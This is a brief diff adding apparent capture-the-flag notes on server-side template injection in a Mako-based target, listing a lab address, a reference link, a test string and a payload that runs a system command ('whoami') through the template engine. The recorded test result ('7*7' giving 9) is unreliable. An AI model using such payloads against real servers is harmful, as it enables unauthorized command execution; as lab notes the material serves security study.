@@ -1,0 +1,13 @@
+Address: 94.237.56.188:49669
+
+Mako Template
+=> May be SSTI
+
+Reference:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#Mako
+
+Testcase:
+${{7*7}} => 9
+
+Payload:
+${self.module.cache.util.os.system("whoami")}
